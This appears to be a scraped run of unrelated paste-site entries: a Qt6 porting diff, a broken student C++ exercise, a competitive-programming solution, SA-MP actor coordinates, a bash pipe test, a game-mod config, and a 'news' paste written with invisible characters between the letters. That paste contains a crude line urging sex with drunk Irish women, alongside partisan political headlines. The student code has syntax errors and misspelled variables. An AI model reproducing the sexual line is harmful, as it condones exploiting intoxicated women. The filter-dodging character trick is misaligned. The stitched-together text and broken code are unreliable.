-    if (!QX11Info::isPlatformX11())
+    if (!X11WindowSystem::instance()->isValid())
         return false;
 
     if (d->ss_info)
@@ -116,7 +119,13 @@ bool IdlePlatform::init()
     old_handler = XSetErrorHandler(xerrhandler);
 
     int event_base, error_base;
-    if (XScreenSaverQueryExtension(QX11Info::display(), &event_base, &error_base)) {
+#if QT_VERSION < QT_VERSION_CHECK(6, 0, 0)
+    auto display = QX11Info::display();
+#else
+    auto x11app = qApp->nativeInterface<QNativeInterface::QX11Application>();
+    auto display = x11app->display();
+#endif
+    if (XScreenSaverQueryExtension(display, &event_base, &error_base)) {
         d->ss_info = XScreenSaverAllocInfo();
         return true;
     }
@@ -146,7 +155,13 @@ int IdlePlatform::secondsIdle()
     if (!d->ss_info)
         return 0;
 
-    if (!XScreenSaverQueryInfo(QX11Info::display(), QX11Info::appRootWindow(), d->ss_info))
+#if QT_VERSION < QT_VERSION_CHECK(6, 0, 0)
+    auto display = QX11Info::display();
+#else
+    auto x11app = qApp->nativeInterface<QNativeInterface::QX11Application>();
+    auto display = x11app->display();
+#endif
+    if (!XScreenSaverQueryInfo(display, X11WindowSystem::instance()->getDesktopRootWindow(), d->ss_info))
         return 0;
     return d->ss_info->idle / 1000;
 #endif // HAVE_XSS
diff --git a/src/x11windowsystem.cpp b/src/x11windowsystem.cpp
index 1efc80c6..868cc0a8 100644
--- a/src/x11windowsystem.cpp
+++ b/src/x11windowsystem.cpp
@@ -377,3 +377,5 @@ bool X11WindowSystem::windowHasAnyOfStates(Window win, const QSet<Atom> &filtere
     }
     return false;
 }
+
+ulong X11WindowSystem::getDesktopRootWindow(){ return getRootWindow(); };
diff --git a/src/x11windowsystem.h b/src/x11windowsystem.h
index db335e80..50e7d213 100644
--- a/src/x11windowsystem.h
+++ b/src/x11windowsystem.h
@@ -44,6 +44,7 @@ public:
     bool                    desktopOfWindow(Window *window, long *desktop);
     void                    x11wmClass(WId wid, QString resName);
     void                    bringToFront(QWidget *w);
+    ulong                   getDesktopRootWindow();
 };
 
 #endif // X11WINDOWSYSTEM_H
"
Wx1zziMN,teza15-sub3-3(nu i terminata),madidino,C++,Sunday 17th of March 2024 05:25:17 PM CDT,"#include <fstream>
#include <iostream>

using namespace std;
int main()
{
    int x;
    int mx,k,nr;
    bool secventa1,secventa2;
    secventa1=secventa2=false;
    ifstream fin(""bac.txt"")
    int p;
    fin>>p;
    while(fin>>x)
    {
        if(p>x && !secventa2)
        {
            seventa1=true;//incepe secventa
            k++;
        }
        else if(p<x && secventa1) //continua secventa inceputa
        {
            seventa2=true;
            k++;
        }
        else if(secventa2 && secventa1 )
        {
            secventa2=secventa1=false;//secventa terminata
        }
        else if(x==p)
        {
            secventa2=secventa1=false;
            k=0;
        }
        p=x;
        if(!secventa2 && !secventa1 && k)//seventa terminata
        {
            if(mx<k)
            {
                mx=k;
            }
            k=0;
        }
    }
    cout<<mx;
    fin.close();
    return 0;
}
"
R0HZviiZ,1878G,fooker,C++,Sunday 17th of March 2024 05:21:56 PM CDT,"#include <bits/stdc++.h>
using namespace std;
#define ll long long

const ll nmax2 = 1e9+7;
const ll nmax = 998244353;

#include <ext/pb_ds/assoc_container.hpp> 
#include <ext/pb_ds/tree_policy.hpp> 
#include <ext/pb_ds/detail/standard_policies.hpp>
using namespace __gnu_pbds;
typedef tree<ll, null_type, less<ll>, rb_tree_tag, tree_order_statistics_node_update> ordered_set;
typedef tree<std::pair<ll, ll>, null_type, less<std::pair<ll,ll>>, rb_tree_tag, tree_order_statistics_node_update> ordered_set_pair;

ll get_set_bits(ll u){
	return __builtin_popcount(u);
}

void solve(){
    ll n;
	std::cin >> n;

	std::vector<ll> a(n + 1);
	for (ll i = 1; i <= n; i++) std::cin >> a[i];

	std::vector<std::vector<ll>> adj(n + 1, std::vector<ll>());

	for (ll i = 1, x, y; i < n; i++){
		std::cin >> x >> y;
		adj[x].push_back(y);
		adj[y].push_back(x);
	}

	ll timer = 1;
	std::vector<ll> tin(n + 1);
	std::vector<ll> tout(n + 1);
	std::vector<ll> dist(n + 1);

	ll next[n + 1][31];
	for (ll i = 0; i <= n; i++){
		for (ll j = 0; j <= 30; j++) next[i][j] = -1;
	}

	std::function<bool(ll, ll)> is_ancestor = [&] (ll u, ll v){
		if (u == -1 or v == -1) return false;
		return ((tin[u] <= tin[v]) && (tout[u] >= tout[v]));
	};	

	std::vector<ll> b(n + 1, -1);

	ll lca[n + 1][21];
	ll or_calc[n + 1][21];
	for (ll i = 0; i <= n; i++){
		for (ll j = 0; j <= 20; j++){
			lca[i][j] = -1;
			or_calc[i][j] = 0;
		}
	}

	std::function<ll(ll, ll)> get_lca = [&] (ll u, ll v){
		if (is_ancestor(u, v)){
			return u;
		}
		if (is_ancestor(v, u)){
			return v;
		}
		for (ll i = 20; i >= 0; i--){
			if (lca[u][i] == -1) continue;
			if (!is_ancestor(lca[u][i], v)){
				u = lca[u][i];
			}
		}
		return lca[u][0];
	};

	std::function<void(ll, ll)> dfs = [&] (ll u, ll p) {
		tin[u] = timer++;
		for (ll i = 30; i >= 0; i--){
			if ((a[u] >> i) & 1){
				b[i] = u;
			}
			next[u][i] = b[i];
		}

		lca[u][0] = p;
		or_calc[u][0] = a[u];
		if (p != -1) or_calc[u][0] |= a[p];

		for (ll i = 1; i <= 20; i++){
			if (lca[u][i - 1] != -1){
				lca[u][i] = lca[lca[u][i - 1]][i - 1];
				or_calc[u][i] = or_calc[u][i - 1] | or_calc[lca[u][i - 1]][i - 1];
			} else{
				or_calc[u][i] = or_calc[u][i - 1];
			}
		}

		for (auto v: adj[u]){
			if (v == p) continue;
			dist[v] = dist[u] + 1;
			dfs(v, u);
		}

		tout[u] = timer++;
	};
	dfs(1, -1);

	std::function<ll(ll, ll)> calc_or = [&] (ll u, ll v){
		ll ans = 0;
		for (ll i = 20; i >= 0; i--){
			if (lca[u][i] == -1) continue;
			if (is_ancestor(v, lca[u][i])){
				ans |= or_calc[u][i];
				u = lca[u][i];
			}
		}
		return ans;
	};

	std::function<ll(ll, ll)> _path_or = [&] (ll u, ll v){
		ll l = get_lca(u, v);
		ll res = calc_or(u, l) | calc_or(v, l);
		return res;
	};

	ll q;
	std::cin >> q;

	for (ll i = 1, x, y; i <= q; i++){
		std::cin >> x >> y;

		std::vector<ll> temp;

		ll fin = 0;
		ll l = get_lca(x, y);
		for (ll j = 0; j <= 30; j++){
			if (next[x][j] != -1 and is_ancestor(l, next[x][j])){
				temp.push_back(next[x][j]);
			}
			if (next[y][j] != -1 and is_ancestor(l, next[y][j])){
				temp.push_back(next[y][j]);
			}
		}
		
		for (auto w: temp){
			fin = std::max(fin, 1LL * get_set_bits(_path_or(x, w)) + 1LL * get_set_bits(_path_or(w, y)));
		}

		std::cout << fin << "" \n""[i == q];
	}	

}	
 
int main(){
    std::ios_base::sync_with_stdio(false);
    std::cin.tie(0);
    std::cout.tie(0);
 
    int t;
    std::cin >> t;
    // t = 1;
    while(t--){
        solve();
    }
    return 0;
}"
GuPhyQhV,Untitled,MichaelFR,C++,Sunday 17th of March 2024 04:59:24 PM CDT,"new ActorAim[52];
	ActorAim[0] = CreateActor(random(311),206.7751,1389.7532,10.5859,random(360)); // act
	ActorAim[1] = CreateActor(random(311),206.9573,1405.2584,10.5859,random(360)); // act
	ActorAim[2] = CreateActor(random(311),219.2890,1409.6844,10.5859,random(360)); // act
	ActorAim[3] = CreateActor(random(311),225.1486,1422.0366,10.5859,random(360)); // act
	ActorAim[4] = CreateActor(random(311),217.4312,1436.9126,10.5859,random(360)); // act
	ActorAim[5] = CreateActor(random(311),218.3847,1458.3525,10.5859,random(360)); // act
	ActorAim[6] = CreateActor(random(311),215.6062,1466.1130,13.1222,random(360)); // act
	ActorAim[7] = CreateActor(random(311),198.9868,1471.6344,10.5859,random(360)); // act
	ActorAim[8] = CreateActor(random(311),163.9602,1471.6791,10.5859,random(360)); // act
	ActorAim[9] = CreateActor(random(311),155.5133,1459.2958,10.6526,random(360)); // act
	ActorAim[10] = CreateActor(random(311),138.5210,1459.7819,10.5994,random(360)); // act
	ActorAim[11] = CreateActor(random(311),124.9077,1455.9995,10.6161,random(360)); // act
	ActorAim[12] = CreateActor(random(311),121.5341,1430.3613,10.6196,random(360)); // act
	ActorAim[13] = CreateActor(random(311),128.4828,1402.0366,10.5940,random(360)); // act
	ActorAim[14] = CreateActor(random(311),131.1624,1388.1967,10.5859,random(360)); // act
	ActorAim[15] = CreateActor(random(311),119.0714,1368.5515,10.5925,random(360)); // act
	ActorAim[16] = CreateActor(random(311),121.3799,1344.8796,10.5859,random(360)); // act
	ActorAim[17] = CreateActor(random(311),149.1525,1345.0079,10.5859,random(360)); // act
	ActorAim[18] = CreateActor(random(311),174.0122,1340.9114,10.5859,random(360)); // act
	ActorAim[19] = CreateActor(random(311),200.6629,1346.5227,10.5859,random(360)); // act
	ActorAim[20] = CreateActor(random(311),224.1392,1346.7184,10.5859,random(360)); // act
	ActorAim[21] = CreateActor(random(311),250.2756,1350.6571,10.5859,random(360)); // act
	ActorAim[22] = CreateActor(random(311),271.4000,1375.7539,10.5859,random(360)); // act
	ActorAim[23] = CreateActor(random(311),270.8050,1385.2416,10.5859,random(360)); // act
	ActorAim[24] = CreateActor(random(311),286.4971,1421.6150,10.5859,random(360)); // act
	//dm war
	ActorAim[25] = CreateActor(random(311),-7239.2026,1107.0192,5.3179,random(360)); //
	ActorAim[26] = CreateActor(random(311),-7252.2783,1093.5608,4.7770,random(360)); //
	ActorAim[27] = CreateActor(random(311),-7263.0376,1072.9088,2.8166,random(360)); //
	ActorAim[28] = CreateActor(random(311),-7229.3472,1057.7878,2.8166,random(360)); //
	ActorAim[29] = CreateActor(random(311),-7239.3350,1069.3428,5.1398,random(360)); //
	ActorAim[30] = CreateActor(random(311),-7227.1440,1097.0332,3.0354,random(360)); //
	ActorAim[31] = CreateActor(random(311),-7230.7476,1124.0919,3.9255,random(360)); //
	ActorAim[32] = CreateActor(random(311),-7210.3394,1135.1965,3.9921,random(360)); //
	ActorAim[33] = CreateActor(random(311),-7165.7725,1124.0004,3.8209,random(360)); //
	ActorAim[34] = CreateActor(random(311),-7182.3354,1086.9879,2.8166,random(360)); //
	ActorAim[35] = CreateActor(random(311),-7193.4976,1099.1359,7.1978,random(360)); //
	ActorAim[36] = CreateActor(random(311),-7166.9033,1134.3599,2.8166,random(360)); //
	ActorAim[37] = CreateActor(random(311),-7145.9551,1099.3264,2.8166,random(360)); //
	ActorAim[38] = CreateActor(random(311),-7138.5972,1084.2490,2.8166,random(360)); //
	ActorAim[39] = CreateActor(random(311),-7145.9478,1079.3251,2.8166,random(360)); //
	ActorAim[40] = CreateActor(random(311),-7122.6401,1129.9442,3.7903,random(360)); //
	ActorAim[41] = CreateActor(random(311),-7146.5752,1140.5142,2.8166,random(360)); //
	ActorAim[42] = CreateActor(random(311),-7117.1563,1146.5071,2.8166,random(360)); //
	ActorAim[43] = CreateActor(random(311),-7141.2964,1138.3015,2.8166,random(360)); //
	//vs arena
	ActorAim[44] = CreateActor(random(311),-2307.2705,618.7783,42.0697,random(360)); //
	ActorAim[45] = CreateActor(random(311),-2307.4082,611.7791,42.0580,random(360)); //
	ActorAim[46] = CreateActor(random(311),-2346.6895,612.4874,42.0673,random(360)); //
	ActorAim[47] = CreateActor(random(311),-2346.4929,618.8197,42.0702,random(360)); //
	ActorAim[48] = CreateActor(random(311),-2334.2544,633.3783,42.0667,random(360)); //
	ActorAim[49] = CreateActor(random(311),-2317.8262,632.6854,42.0668,random(360)); //
	ActorAim[50] = CreateActor(random(311),-2318.0789,602.4740,42.0233,random(360)); //
	ActorAim[51] = CreateActor(random(311),-2331.4766,603.0689,42.0259,random(360)); //
	for(new aa = 0; aa < 52; aa++) {
	     SetActorVirtualWorld(ActorAim[aa], 5);
	}"
qd42nmYU,Untitled,Skybluepink-Baphomet,Bash,Sunday 17th of March 2024 04:53:59 PM CDT,"#!/usr/bin/sh

# stop using /bin/sh why are you doing this to yourself also you may want to
# just restructure everything because this is awful

POSTPROCESSING=""cat""

INPUT=""never seen""
OUTPUT=""never seen""

echo ""failing test will output nothing""
OUTPUT=$( \
  ( /bin/echo -e ""a\nb\nc"" ) | {
    read FIRST
    read SECOND
    read THIRD

    echo ""$FIRST ; $SECOND ; $THIRD""
    exit 123
  }
) && echo ""$OUTPUT"" | $POSTPROCESSING

echo ""successing test, will output d ; e ; f""
OUTPUT=$( \
  ( /bin/echo -e ""d\ne\nf"" ) | {
    read FIRST
    read SECOND
    read THIRD

    echo ""$FIRST ; $SECOND ; $THIRD""
    exit 0
  }
) && echo ""$OUTPUT"" | $POSTPROCESSING"
9zGC5VQQ,Untitled,Amakesh,TypeScript,Sunday 17th of March 2024 04:50:18 PM CDT,"module LifePathBonuses

class ConfigGangCorpTraits {
  public static func ImmuneToUltimateHacks(affiliation: gamedataAffiliation) -> Bool = false
  public static func ImmuneToCovertHacks(affiliation: gamedataAffiliation) -> Bool = false
  public static func ImmuneToDamageHacks(affiliation: gamedataAffiliation) -> Bool = false
  public static func ImmuneToControlHacks(affiliation: gamedataAffiliation) -> Bool = false
  public static func UploadTimeAdd(affiliation: gamedataAffiliation) -> Float = 0.0
  public static func RamCostAdd(affiliation: gamedataAffiliation) -> Float = 0.0

  public static func ImmuneToBleeding(affiliation: gamedataAffiliation) -> Bool = false
  public static func ImmuneToBurning(affiliation: gamedataAffiliation) -> Bool = false
  public static func ImmuneToPoisoning(affiliation: gamedataAffiliation) -> Bool = false
  public static func ImmuneToElectrocution(affiliation: gamedataAffiliation) -> Bool = false
  public static func ImmuneToStun(affiliation: gamedataAffiliation) -> Bool = false

  public static func OneShotProtection(affiliation: gamedataAffiliation) -> Float = 100.0
  public static func SmartBulletMissProbability(affiliation: gamedataAffiliation) -> Float = 0.0
  public static func DetectionMultiplier(affiliation: gamedataAffiliation) -> Float = 1.0

  public static func HeadShotMult(affiliation: gamedataAffiliation) -> Float = 1.0
  public static func CriticalHitMult(affiliation: gamedataAffiliation) -> Float = 1.0
  public static func TechChargedMult(affiliation: gamedataAffiliation) -> Float = 1.0
  public static func RicochetMult(affiliation: gamedataAffiliation) -> Float = 1.0
  public static func StealthAttackMult(affiliation: gamedataAffiliation) -> Float = 1.0

  public static func PowerWeaponsMult(affiliation: gamedataAffiliation) -> Float = 1.0
  public static func TechWeaponsMult(affiliation: gamedataAffiliation) -> Float = 1.0
  public static func SmartWeaponsMult(affiliation: gamedataAffiliation) -> Float = 1.0
  public static func QuickHackDamageMult(affiliation: gamedataAffiliation) -> Float = 1.0

  public static func WeaponHandgunsMult(affiliation: gamedataAffiliation) -> Float = 1.0
  public static func WeaponAssaultMult(affiliation: gamedataAffiliation) -> Float = 1.0
  public static func WeaponAnnihilationMult(affiliation: gamedataAffiliation) -> Float = 1.0
  public static func WeaponGrenadesMult(affiliation: gamedataAffiliation) -> Float = 1.0
  public static func WeaponBladesMult(affiliation: gamedataAffiliation) -> Float = 1.0
  public static func WeaponBluntMeleeMult(affiliation: gamedataAffiliation) -> Float = 1.0

  public static func PlayerArmorMult(affiliation: gamedataAffiliation) -> Float = 1.0
  public static func DamageToPlayerMult(affiliation: gamedataAffiliation) -> Float = 1.0
}

public func setupAffiliationQuickHackModifiers(affiliation: gamedataAffiliation, out modifiers: ref<AffiliationQuickHackModifiers>) -> Void {
  /*modifiers.immuneToUltimateHacks = ConfigGangCorpTraits.ImmuneToUltimateHacks(affiliation);
  modifiers.immuneToCovertHacks = ConfigGangCorpTraits.ImmuneToCovertHacks(affiliation);
  modifiers.immuneToDamageHacks = ConfigGangCorpTraits.ImmuneToDamageHacks(affiliation);
  modifiers.immuneToControlHacks = ConfigGangCorpTraits.ImmuneToControlHacks(affiliation);
  modifiers.ramCostAdd = ConfigGangCorpTraits.RamCostAdd(affiliation);
  modifiers.uploadTimeAdd = ConfigGangCorpTraits.UploadTimeAdd(affiliation);*/
}

public func setupAffiliationDamageToNPCModifiers(affiliation: gamedataAffiliation, out modifiers: ref<AffiliationDamageToNPCModifiers>) -> Void {
/*modifiers.immuneToBleeding = ConfigGangCorpTraits.ImmuneToBleeding(affiliation);
  modifiers.immuneToBurning = ConfigGangCorpTraits.ImmuneToBurning(affiliation);
  modifiers.immuneToPoisoning = ConfigGangCorpTraits.ImmuneToPoisoning(affiliation);
  modifiers.immuneToElectrocution = ConfigGangCorpTraits.ImmuneToElectrocution(affiliation);
  modifiers.immuneToStun = ConfigGangCorpTraits.ImmuneToStun(affiliation);
  modifiers.oneShotProtection = ConfigGangCorpTraits.OneShotProtection(affiliation);
  modifiers.headShotMult = ConfigGangCorpTraits.HeadShotMult(affiliation);
  modifiers.criticalHitMult = ConfigGangCorpTraits.CriticalHitMult(affiliation);
  modifiers.techChargedMult = ConfigGangCorpTraits.TechChargedMult(affiliation);
  modifiers.ricochetMult = ConfigGangCorpTraits.RicochetMult(affiliation);
  modifiers.stealthAttackMult = ConfigGangCorpTraits.StealthAttackMult(affiliation);
  modifiers.powerWeaponsMult = ConfigGangCorpTraits.PowerWeaponsMult(affiliation);
  modifiers.techWeaponsMult = ConfigGangCorpTraits.TechWeaponsMult(affiliation);
  modifiers.smartWeaponsMult = ConfigGangCorpTraits.SmartWeaponsMult(affiliation);
  modifiers.quickHackDamageMult = ConfigGangCorpTraits.QuickHackDamageMult(affiliation);
  modifiers.weaponHandgunsMult = ConfigGangCorpTraits.WeaponHandgunsMult(affiliation);
  modifiers.weaponAssaultMult = ConfigGangCorpTraits.WeaponAssaultMult(affiliation);
  modifiers.weaponAnnihilationMult = ConfigGangCorpTraits.WeaponAnnihilationMult(affiliation);
  modifiers.weaponGrenadesMult = ConfigGangCorpTraits.WeaponGrenadesMult(affiliation);
  modifiers.weaponBladesMult = ConfigGangCorpTraits.WeaponBladesMult(affiliation);
  modifiers.weaponBluntMeleeMult = ConfigGangCorpTraits.WeaponBluntMeleeMult(affiliation);*/
}

public func setupAffiliationDamageToPlayerModifiers(affiliation: gamedataAffiliation, out modifiers: ref<AffiliationDamageToPlayerModifiers>) -> Void {
  /*modifiers.playerArmorMult = ConfigGangCorpTraits.PlayerArmorMult(affiliation);
  modifiers.damageToPlayerMult = ConfigGangCorpTraits.DamageToPlayerMult(affiliation);*/
}

public func setupAffiliationSystemModifiers(affiliation: gamedataAffiliation, out modifiers: ref<AffiliationSystemModifiers>) -> Void {
  /*modifiers.detectionMultiplier = ConfigGangCorpTraits.DetectionMultiplier(affiliation);
  modifiers.smartBulletMissProbability = ConfigGangCorpTraits.SmartBulletMissProbability(affiliation);*/
}
"
kNVreE4L,News March17 24,Newscaster_Ned,Email,Sunday 17th of March 2024 04:49:14 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎a‎p‎p‎y‎ ‎S‎a‎i‎n‎t‎ ‎P‎a‎t‎r‎i‎c‎k‎'‎s‎ ‎D‎a‎y‎!‎ ‎R‎e‎m‎e‎m‎b‎e‎r‎ ‎t‎o‎ ‎f‎u‎c‎k‎ ‎s‎o‎m‎e‎ ‎d‎r‎u‎n‎k‎ ‎I‎r‎i‎s‎h‎ ‎g‎i‎r‎l‎s‎!‎

M‎e‎d‎i‎a‎ ‎G‎o‎ ‎H‎o‎a‎x‎ ‎W‎i‎l‎d‎:‎ ‎T‎r‎u‎m‎p‎ ‎F‎a‎l‎s‎e‎l‎y‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎o‎f‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎i‎n‎g‎ ‎‘‎B‎l‎o‎o‎d‎b‎a‎t‎h‎’‎ ‎i‎f‎ ‎H‎e‎ ‎L‎o‎s‎e‎s‎

W‎a‎s‎ ‎T‎a‎l‎k‎i‎n‎g‎ ‎A‎b‎o‎u‎t‎ ‎a‎u‎t‎o‎ ‎i‎n‎d‎u‎s‎t‎r‎y‎!‎

B‎i‎d‎e‎n‎ ‎C‎a‎m‎p‎a‎i‎g‎n‎ ‎F‎u‎e‎l‎s‎ ‎F‎a‎k‎e‎ ‎N‎e‎w‎s‎ ‎F‎r‎e‎n‎z‎y‎
F‎o‎r‎m‎e‎r‎ ‎U‎S‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎a‎n‎d‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎i‎a‎l‎ ‎c‎a‎n‎d‎i‎d‎a‎t‎e‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎g‎e‎s‎t‎u‎r‎e‎s‎ ‎a‎s‎ ‎h‎e‎ ‎a‎r‎r‎i‎
F‎o‎r‎m‎e‎r‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎o‎n‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎n‎i‎g‎h‎t‎ ‎f‎o‎r‎e‎c‎a‎s‎t‎ ‎a‎ ‎f‎i‎n‎a‎n‎c‎i‎a‎l‎ ‎“‎b‎l‎o‎o‎d‎b‎a‎t‎h‎”‎ ‎a‎w‎a‎i‎t‎s‎ ‎t‎h‎e‎ ‎U‎.‎S‎.‎ ‎m‎o‎t‎o‎r‎ ‎i‎n‎d‎u‎s‎t‎r‎y‎ ‎i‎f‎ ‎h‎e‎ ‎i‎s‎ ‎n‎o‎t‎ ‎e‎l‎e‎c‎t‎e‎d‎ ‎a‎n‎d‎ ‎C‎h‎i‎n‎a‎ ‎i‎s‎ ‎e‎n‎a‎b‎l‎e‎d‎ ‎t‎o‎ ‎s‎w‎a‎m‎p‎ ‎t‎h‎e‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎i‎r‎ ‎p‎r‎o‎d‎u‎c‎t‎s‎.‎

M‎a‎c‎r‎o‎n‎ ‎R‎e‎p‎e‎a‎t‎s‎ ‎T‎h‎r‎e‎a‎t‎ ‎o‎f‎ ‎W‎e‎s‎t‎e‎r‎n‎ ‎G‎r‎o‎u‎n‎d‎ ‎F‎o‎r‎c‎e‎s‎ ‎i‎n‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎‘‎a‎t‎ ‎S‎o‎m‎e‎ ‎P‎o‎i‎n‎t‎’‎
M‎a‎c‎r‎o‎n‎ ‎R‎e‎f‎u‎s‎e‎s‎ ‎t‎o‎ ‎D‎i‎s‎m‎i‎s‎s‎ ‎P‎o‎s‎s‎i‎b‎i‎l‎i‎t‎y‎ ‎o‎f‎ ‎W‎e‎s‎t‎e‎r‎n‎ ‎G‎r‎o‎u‎n‎d‎ ‎F‎o‎r‎c‎e‎s‎ ‎i‎n‎ ‎U‎k‎r‎a‎i‎n‎e‎
7‎7‎2‎
T‎r‎u‎m‎p‎ ‎a‎t‎ ‎O‎h‎i‎o‎ ‎R‎a‎l‎l‎y‎:‎ ‎L‎a‎k‎e‎n‎ ‎R‎i‎l‎e‎y‎’‎s‎ ‎K‎i‎l‎l‎e‎r‎ ‎I‎s‎ ‎‘‎A‎n‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎’‎
T‎r‎u‎m‎p‎ ‎a‎t‎ ‎O‎h‎i‎o‎ ‎R‎a‎l‎l‎y‎:‎ ‎L‎a‎k‎e‎n‎ ‎R‎i‎l‎e‎y‎'‎s‎ ‎K‎i‎l‎l‎e‎r‎ ‎i‎s‎ ‎'‎A‎n‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎'‎
1‎,‎8‎9‎1‎
P‎e‎l‎o‎s‎i‎:‎ ‎W‎e‎ ‎H‎a‎v‎e‎ ‎t‎o‎ ‎W‎i‎n‎ ‎T‎h‎i‎s‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎‘‎P‎r‎e‎d‎i‎c‎t‎i‎n‎g‎ ‎a‎ ‎B‎l‎o‎o‎d‎b‎a‎t‎h‎’‎
P‎e‎l‎o‎s‎i‎:‎ ‎W‎e‎ ‎H‎a‎v‎e‎ ‎t‎o‎ ‎W‎i‎n‎ ‎T‎h‎i‎s‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎T‎r‎u‎m‎p‎ ‎P‎e‎l‎o‎s‎i‎:‎ ‎W‎e‎ ‎H‎a‎v‎e‎ ‎t‎o‎ ‎W‎i‎n‎ ‎t‎
1‎,‎2‎2‎7‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎A‎s‎s‎o‎c‎i‎a‎t‎e‎d‎ ‎P‎r‎e‎s‎s‎ ‎A‎d‎m‎i‎t‎s‎ ‎I‎t‎ ‎H‎a‎s‎ ‎N‎o‎ ‎‘‎G‎e‎o‎l‎o‎c‎a‎t‎i‎o‎n‎ ‎D‎a‎t‎a‎’‎ ‎t‎o‎ ‎B‎a‎c‎k‎ ‎U‎p‎ ‎B‎e‎r‎n‎i‎e‎ ‎M‎o‎r‎e‎n‎o‎ ‎S‎m‎e‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎A‎P‎ ‎A‎d‎m‎i‎t‎s‎ ‎I‎t‎ ‎H‎a‎s‎ ‎N‎o‎ ‎‘‎G‎e‎o‎l‎o‎c‎a‎t‎i‎o‎n‎ ‎D‎a‎t‎a‎’‎ ‎t‎o‎ ‎B‎a‎c‎k‎ ‎U‎p‎ ‎M‎o‎r‎e‎n‎o‎ ‎S‎m‎e‎a‎r‎
3‎,‎3‎5‎8‎
E‎l‎l‎i‎o‎t‎ ‎P‎a‎g‎e‎:‎ ‎L‎G‎B‎T‎Q‎Q‎I‎A‎A‎P‎2‎S‎+‎-‎T‎h‎e‎m‎e‎d‎ ‎F‎i‎l‎m‎s‎ ‎A‎r‎e‎ ‎N‎o‎t‎ ‎‘‎N‎i‎c‎h‎e‎’‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎3‎0‎%‎ ‎o‎f‎ ‎Y‎o‎u‎t‎h‎ ‎I‎d‎e‎n‎t‎i‎f‎y‎ ‎a‎
E‎l‎l‎i‎o‎t‎ ‎P‎a‎g‎e‎:‎ ‎L‎G‎B‎T‎Q‎Q‎I‎A‎A‎P‎2‎S‎+‎ ‎F‎i‎l‎m‎s‎ ‎A‎r‎e‎ ‎N‎o‎t‎ ‎'‎N‎i‎c‎h‎e‎,‎'‎ ‎3‎0‎%‎ ‎o‎f‎ ‎Y‎o‎u‎t‎h‎ ‎A‎r‎e‎ ‎Q‎u‎e‎e‎r‎
1‎9‎2‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎–‎ ‎T‎r‎u‎m‎p‎ ‎2‎0‎2‎4‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎P‎r‎e‎s‎s‎ ‎S‎e‎c‎r‎e‎t‎a‎r‎y‎ ‎K‎a‎r‎o‎l‎i‎n‎e‎ ‎L‎e‎a‎v‎i‎t‎t‎:‎ ‎T‎h‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎a‎r‎t‎y‎ ‎‘‎I‎s‎ ‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎–‎ ‎K‎a‎r‎o‎l‎i‎n‎e‎ ‎L‎e‎a‎v‎i‎t‎t‎:‎ ‎T‎h‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎a‎r‎t‎y‎ ‎'‎I‎s‎ ‎t‎h‎e‎ ‎P‎a‎r‎t‎y‎ ‎o‎f‎ ‎W‎o‎m‎e‎n‎”‎
5‎,‎5‎4‎2‎
H‎o‎l‎d‎e‎r‎:‎ ‎M‎e‎d‎i‎a‎ ‎W‎i‎l‎l‎ ‎C‎h‎a‎n‎g‎e‎ ‎C‎o‎v‎e‎r‎a‎g‎e‎ ‎a‎n‎d‎ ‎T‎h‎a‎t‎’‎l‎l‎ ‎H‎e‎l‎p‎ ‎B‎i‎d‎e‎n‎ ‎W‎i‎n‎
H‎o‎l‎d‎e‎r‎:‎ ‎M‎e‎d‎i‎a‎ ‎W‎i‎l‎l‎ ‎C‎h‎a‎n‎g‎e‎ ‎C‎o‎v‎e‎r‎a‎g‎e‎ ‎a‎n‎d‎ ‎T‎h‎a‎t‎'‎l‎l‎ ‎H‎e‎l‎p‎ ‎B‎i‎d‎e‎n‎ ‎W‎i‎n‎
3‎,‎3‎5‎7‎
